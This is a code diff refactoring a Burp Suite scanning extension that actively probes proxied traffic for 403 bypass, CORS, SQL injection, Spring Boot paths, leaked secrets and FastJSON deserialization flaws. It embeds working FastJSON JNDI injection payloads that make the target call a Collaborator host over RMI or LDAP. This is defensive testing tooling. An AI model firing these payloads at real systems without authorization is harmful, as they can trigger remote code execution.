@@ -7,27 +7,31 @@ import burp.api.montoya.http.message.responses.HttpResponse;
 
 import java.net.MalformedURLException;
 import java.util.*;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class MyHttpHandler implements HttpHandler {
     private final MontoyaApi montoyaApi;
     private final MyTableModel tableModel;
     private final ConfigModel configModel;
 
-    private int id = 1;
-    List<String> fastjsonPayload = new ArrayList<>(List.of(
+    private final AtomicInteger id = new AtomicInteger(1);  //原子类
+    private final ExecutorService threadPool = Executors.newFixedThreadPool(10);
+
+    private final List<String> fastjsonPayload = List.of(
             "{\"axin\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
             "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
             "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://fast.%s/aaa\",\"autoCommit\":true}"
-    ));
-    List<String> fastjsonPayloadError = new ArrayList<>(List.of(
+    );
+    private final List<String> fastjsonPayloadError = List.of(
             "{\"@type\": \"java.lang.AutoCloseable\"",
             "[\"test\":1]"
-    ));
+    );
 
     public MyHttpHandler(MontoyaApi montoyaApi, MyTableModel tableModel, ConfigModel configModel) {
         this.montoyaApi = montoyaApi;
         this.tableModel = tableModel;
-        this.configModel = configModel; // 初始化配置模型
+        this.configModel = configModel;
     }
 
     @Override
@@ -36,35 +40,50 @@ public class MyHttpHandler implements HttpHandler {
     }
 
     @Override
-    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) throws InterruptedException {
+    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
         boolean bypass403Enabled = configModel.isBypass403Enabled();
         boolean fastjsonEnabled = configModel.isFastjsonEnabled();
-        boolean springbootEnables  = configModel.isspringbootEnabled();
+        boolean springbootEnabled = configModel.isspringbootEnabled();
         boolean corsEnabled = configModel.isCorsEnabled();
         boolean juniorSqlEnabled = configModel.isJuniorSqlEnabled();
+        boolean findSecretEnabled = configModel.isFindSecretEnabled();
 
         if (bypass403Enabled) {
-            handleBypass403(responseReceived);
+            submitTask(() -> handleBypass403VulnerabilityDetection(responseReceived));
         }
 
         if (fastjsonEnabled) {
-            handleFastJsonVulnerabilityDetection(responseReceived);
+            submitTask(() -> handleFastJsonVulnerabilityDetection(responseReceived));
         }
-        if (springbootEnables) {
-            handleSpringBootVulnerabilityDetection(responseReceived);
+
+        if (springbootEnabled) {
+            submitTask(() -> handleSpringBootVulnerabilityDetection(responseReceived));
         }
+
         if (corsEnabled) {
-            handleCors(responseReceived);
+            submitTask(() -> handleCorsDetection(responseReceived));
         }
+
         if (juniorSqlEnabled) {
-            handleSQLInjectionVulnerabilityDetection(responseReceived);
+            submitTask(() -> handleSQLInjectionVulnerabilityDetection(responseReceived));
         }
+
+        if (findSecretEnabled) {
+            submitTask(() -> handleFindSecretVulnerabilityDetection(responseReceived));
+        }
+
 
         return null;
     }
 
+    private void handleBypass403VulnerabilityDetection(HttpResponseReceived responseReceived) {
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            handleBypass403(responseReceived);
+        }
+    }
+
     private void handleBypass403(HttpResponseReceived responseReceived) {
-        if(MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
             HttpRequest firstHttpRequest = responseReceived.initiatingRequest();
             HttpResponse firstResponse = montoyaApi.http().sendRequest(firstHttpRequest).response();
             if (firstResponse.statusCode() == 403) {
@@ -79,184 +98,215 @@ public class MyHttpHandler implements HttpHandler {
 
                 HttpResponse twiceResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
 
-
                 int twiceLength = twiceResponse.body().length();
 
                 if (twiceLength != firstLength && twiceResponse.statusCode() != 403) {
-                    tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "403 bypass", twiceLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, twiceResponse), modifiedRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), twiceResponse.statusCode()));
-                    id++;
+                    tableModel.add(new SourceLogEntry(
+                            id.getAndIncrement(),
+                            responseReceived.toolSource().toolType().toolName(),
+                            null,
+                            "403 bypass",
+                            twiceLength,
+                            HttpRequestResponse.httpRequestResponse(modifiedRequest, twiceResponse),
+                            modifiedRequest.httpService().toString(),
+                            responseReceived.initiatingRequest().pathWithoutQuery(),
+                            twiceResponse.statusCode()
+                    ));
                 }
             }
         }
     }
 
     private void handleFastJsonVulnerabilityDetection(HttpResponseReceived responseReceived) {
-        new Thread(() -> {
-            try {
-                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
-                    HttpRequest initHttpRequest = responseReceived.initiatingRequest();
-                    String body = initHttpRequest.body().toString();
-                    if (body != null && body.length() > 0 && strMatch(body, "json")) {
-                        detectFastJsonVulnerability(initHttpRequest, responseReceived);
-                    }
-                }
-            } catch (Exception e) {
-                // 异常处理
-                montoyaApi.logging().logToOutput("FastJSON检测线程发生错误：" + e.getMessage());
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            HttpRequest initHttpRequest = responseReceived.initiatingRequest();
+            String body = initHttpRequest.body().toString();
+            if (body != null && body.length() > 0 && strMatch(body, "json")) {
+                detectFastJsonVulnerability(initHttpRequest, responseReceived);
             }
-        }).start();
+        }
     }
 
-    private void detectFastJsonVulnerability(HttpRequest initHttpRequest, HttpResponseReceived responseReceived) throws InterruptedException {
-        int modifiedLength = 0;
-
-
-        // FASTJSON检测逻辑，使用协作器检测
+    private void detectFastJsonVulnerability(HttpRequest initHttpRequest, HttpResponseReceived responseReceived) {
         CollaboratorClient collaboratorClient = montoyaApi.collaborator().createClient();
 
         for (String payload : fastjsonPayload) {
-            HttpResponse modifiedResponse = null;
-            HttpRequest modifiedRequest = null;
             String dnsDomain = collaboratorClient.generatePayload().toString();
             String formatPayload = String.format(payload, dnsDomain);
+            HttpRequest modifiedRequest = initHttpRequest.withBody(formatPayload);
+            HttpResponse modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
 
-            modifiedRequest = initHttpRequest.withBody(formatPayload);
-            modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
-            modifiedLength = modifiedResponse.body().length();
-
-            Thread.sleep(2000);
-
+            try {
+                Thread.sleep(2000);
+            } catch (InterruptedException e) {
+                montoyaApi.logging().logToOutput("FastJSON检测线程被中断：" + e.getMessage());
+                return;
+            }
 
             List<Interaction> interactions = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(dnsDomain));
             if (interactions != null && !interactions.isEmpty()) {
-                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "FastJson Vul", modifiedLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, modifiedResponse), initHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), modifiedResponse.statusCode()));
-                id++;
-                break;
+                logVulnerability(
+                        responseReceived,
+                        modifiedRequest,
+                        modifiedResponse,
+                        "FastJson Vul"
+                );
+                return;
             }
         }
 
-        // 尝试检测版本信息
         for (String payloadError : fastjsonPayloadError) {
-            HttpResponse modifiedResponse = null;
-            HttpRequest modifiedRequest = null;
-            modifiedRequest = initHttpRequest.withBody(payloadError);
-            modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
-            modifiedLength = modifiedResponse.body().length();
+            HttpRequest modifiedRequest = initHttpRequest.withBody(payloadError);
+            HttpResponse modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
 
             if (modifiedResponse.bodyToString().contains("Version") || modifiedResponse.bodyToString().contains("1.2.")) {
-                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find FastJson Version,Please Try More", modifiedLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, modifiedResponse), initHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), modifiedResponse.statusCode()));
-                id++;
-                break;
+                logVulnerability(
+                        responseReceived,
+                        modifiedRequest,
+                        modifiedResponse,
+                        "Find FastJson Version"
+                );
+                return;
             }
         }
     }
 
-     //探测Springboot的线程
     private void handleSpringBootVulnerabilityDetection(HttpResponseReceived responseReceived) {
-        new Thread(() -> {
-            try {
-                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
-                    detectFastJsonVulnerability(responseReceived);
-                }
-            } catch (Exception e) {
-                // 异常处理
-                montoyaApi.logging().logToOutput("SpringBoot检测线程发生错误：" + e.getMessage());
-            }
-        }).start();
-
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            detectSpringBootVulnerability(responseReceived);
+        }
     }
-    //springboot检测
-    private void detectFastJsonVulnerability(HttpResponseReceived responseReceived) throws MalformedURLException, InterruptedException {
+
+    private void detectSpringBootVulnerability(HttpResponseReceived responseReceived) {
         HttpRequest httpRequest = responseReceived.initiatingRequest();
-        //HttpResponse httpResponse = montoyaApi.http().sendRequest(httpRequest).response();
         String url = httpRequest.url();
-        // 使用 java.net.URL 类来解析 URL
-        java.net.URL parsedUrl = new java.net.URL(url);
-        // 构建基本路径：协议 + 主机 + 端口 + 路径的起始
-        int port = parsedUrl.getPort();
-        String baseUrl = null;
-        if (port == -1) {
-            baseUrl = parsedUrl.getProtocol() + "://" + parsedUrl.getHost() +"/";
-        }else {
-            baseUrl = parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + ":" + port + "/";
-        }
+        try {
+            java.net.URL parsedUrl = new java.net.URL(url);
+            int port = parsedUrl.getPort();
+            String baseUrl = port == -1
+                    ? parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + "/"
+                    : parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + ":" + port + "/";
 
+            SpringBootScan springBootScan = new SpringBootScan(baseUrl, httpRequest, montoyaApi);
+            boolean isIcoOfSpring = springBootScan.getIcoHash();
+            boolean pathError = springBootScan.getPathError();
 
-        //探测是否为SpringBoot框架
-        SpringBootScan springBootScan = new SpringBootScan(baseUrl,httpRequest,montoyaApi);
-        boolean isIcoOfSpring = springBootScan.getIcoHash();
-        boolean pathError = springBootScan.getPathError();
-
-
-        //如果检测到SpringBoot，进行下一步探测
-        if (isIcoOfSpring || pathError) {
-            //montoyaApi.logging().logToOutput("检测到Spring Boot");
-            HashMap<HttpRequest, HttpResponse> pathRequestReponse = springBootScan.startPathScan();
-            if (pathRequestReponse != null && !pathRequestReponse.isEmpty()) {
-                for (Map.Entry<HttpRequest, HttpResponse> entry : pathRequestReponse.entrySet()) {
-                    HttpRequest request = entry.getKey();
-                    HttpResponse response = entry.getValue();
-                    int length = response.body().length();
-                    tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find SpringBoot Path", length, HttpRequestResponse.httpRequestResponse(request, response), request.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), response.statusCode()));
-                    id++;
+            if (isIcoOfSpring || pathError) {
+                HashMap<HttpRequest, HttpResponse> pathRequestReponse = springBootScan.startPathScan();
+                if (pathRequestReponse != null && !pathRequestReponse.isEmpty()) {
+                    for (Map.Entry<HttpRequest, HttpResponse> entry : pathRequestReponse.entrySet()) {
+                        HttpRequest request = entry.getKey();
+                        HttpResponse response = entry.getValue();
+                        logVulnerability(
+                                responseReceived,
+                                request,
+                                response,
+                                "Find SpringBoot Path"
+                        );
+                    }
                 }
             }
-
+        } catch (MalformedURLException | InterruptedException e) {
+            montoyaApi.logging().logToOutput("SpringBoot检测发生错误：" + e.getMessage());
         }
     }
 
-    private void handleCors(HttpResponseReceived responseReceived) {
-        HttpRequest corsHttpRequest = responseReceived.initiatingRequest();
-        corsHttpRequest.withHeader("Origin", "*");
+    private void handleCorsDetection(HttpResponseReceived responseReceived) {
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            handleCorsVulnerability(responseReceived);
+        }
+    }
+
+    private void handleCorsVulnerability(HttpResponseReceived responseReceived) {
+        HttpRequest corsHttpRequest = responseReceived.initiatingRequest().withHeader("Origin", "*");
         HttpResponse corsResponse = montoyaApi.http().sendRequest(corsHttpRequest).response();
-        //corsHttpRequest.with
-        int length = corsResponse.body().length();
-        if(corsResponse.statusCode() == 200 && corsResponse.hasHeader("Access-Control-Allow-Origin","*") && corsResponse.hasHeader("Access-Control-Allow-Credentials","*")){
-            tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find SpringBoot Path", length, HttpRequestResponse.httpRequestResponse(corsHttpRequest, corsResponse), corsHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), corsResponse.statusCode()));
-            id++;
+
+        if (corsResponse.statusCode() == 200 &&
+                corsResponse.hasHeader("Access-Control-Allow-Origin", "*") &&
+                corsResponse.hasHeader("Access-Control-Allow-Credentials", "*")) {
+            logVulnerability(
+                    responseReceived,
+                    corsHttpRequest,
+                    corsResponse,
+                    "CORS Vul"
+            );
         }
     }
 
     private void handleSQLInjectionVulnerabilityDetection(HttpResponseReceived responseReceived) {
-        new Thread(() -> {
-            try {
-                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
-                    detectSQLInjectionVulnerability(responseReceived);
-                }
-            } catch (Exception e) {
-                // 异常处理
-                montoyaApi.logging().logToOutput("SQLInjection检测线程发生错误：" + e.getMessage());
-            }
-        }).start();
-
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            detectSQLInjectionVulnerability(responseReceived);
+        }
     }
-    private void detectSQLInjectionVulnerability(HttpResponseReceived responseReceived) throws InterruptedException {
+
+    private void detectSQLInjectionVulnerability(HttpResponseReceived responseReceived) {
         HttpRequest httpRequest = responseReceived.initiatingRequest();
         String baseUrl = httpRequest.url();
 
-        //发送原始请求，获取最初长度用于之后长度对比
-        //HttpResponse onceResponse = montoyaApi.http().sendRequest(httpRequest).response();
-        //int onceLength = onceResponse.bodyToString().length();
+        try {
+            JuniorSqlDetection juniorSqlDetection = new JuniorSqlDetection(baseUrl, httpRequest, montoyaApi);
+            HashMap<HttpRequest, HttpResponse> sqlRequestResponse = juniorSqlDetection.SqlDetection();
 
-        JuniorSqlDetection juniorSqlDetection = new JuniorSqlDetection(baseUrl,httpRequest,montoyaApi);
-        HashMap<HttpRequest, HttpResponse> SqlRequestReponse = juniorSqlDetection.SqlDetection();
+            if (sqlRequestResponse != null && !sqlRequestResponse.isEmpty()) {
+                for (Map.Entry<HttpRequest, HttpResponse> entry : sqlRequestResponse.entrySet()) {
+                    HttpRequest request = entry.getKey();
+                    HttpResponse response = entry.getValue();
+                    String lengthDiff = getLengthDiff(request);
+                    logVulnerability(
+                            responseReceived,
+                            request,
+                            response,
+                            "SQL ERROR, Len Change: " + lengthDiff
+                    );
+                }
+            }
+        } catch (InterruptedException e) {
+            montoyaApi.logging().logToOutput("SQLInjection检测线程被中断：" + e.getMessage());
+        }
+    }
 
-        if (SqlRequestReponse != null && !SqlRequestReponse.isEmpty()) {
-            for (Map.Entry<HttpRequest, HttpResponse> entry : SqlRequestReponse.entrySet()) {
+    private void logVulnerability(HttpResponseReceived responseReceived, HttpRequest request, HttpResponse response, String vulnerabilityType) {
+        tableModel.add(new SourceLogEntry(
+                id.getAndIncrement(),
+                responseReceived.toolSource().toolType().toolName(),
+                null,
+                vulnerabilityType,
+                response.body().length(),
+                HttpRequestResponse.httpRequestResponse(request, response),
+                request.httpService().toString(),
+                responseReceived.initiatingRequest().pathWithoutQuery(),
+                response.statusCode()
+        ));
+    }
 
-                HttpRequest request = entry.getKey();
-                HttpResponse response = entry.getValue();
-                int length = response.body().length();
-
-                //montoyaApi.logging().logToOutput(getLengthDiff(request));
-                String lengthDiff = getLengthDiff(request);
-
-                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "SQL ERROR, Len Change: "+lengthDiff, length, HttpRequestResponse.httpRequestResponse(request, response), request.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), response.statusCode()));
-                id++;
+    private void handleFindSecretVulnerabilityDetection(HttpResponseReceived responseReceived) {
+        if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
+            FindSecretVulnerability(responseReceived);
+        }
+    }
+    private void FindSecretVulnerability(HttpResponseReceived responseReceived) {
+        HttpRequest firstHttpRequest = responseReceived.initiatingRequest();
+        //String baseUrl = firstHttpRequest.url();
+        FindSecret findSecret = new FindSecret();
+        HttpResponse response = montoyaApi.http().sendRequest(firstHttpRequest).response();
+        String responseBody = response.bodyToString();
+        List<String> result = findSecret.detectSensitiveInfo(responseBody,montoyaApi);
+        montoyaApi.logging().logToOutput(result.toString());
+        if (result != null && !result.isEmpty()) {
+            for (String sensitiveInfo : result) {
+                logVulnerability(
+                        responseReceived,
+                        firstHttpRequest,
+                        response,
+                        "Sensitive Information Detected: " + sensitiveInfo
+                );
             }
         }
     }
 
+    private void submitTask(Runnable task) {
+        threadPool.submit(task);
+    }
 
     public static boolean strMatch(String str, String pattern) {
         if ("json".equals(pattern)) {
@@ -264,7 +314,20 @@ public class MyHttpHandler implements HttpHandler {
         }
         return false;
     }
+
     public static String getLengthDiff(HttpRequest request) {
         return request.headerValue("X-Length-Diff");
+    }
+
+    // 在程序结束时关闭线程池
+    public void shutdown() {
+        threadPool.shutdown();
+        try {
+            if (!threadPool.awaitTermination(5, TimeUnit.SECONDS)) {
+                threadPool.shutdownNow();
+            }
+        } catch (InterruptedException e) {
+            threadPool.shutdownNow();
+        }
     }
 }
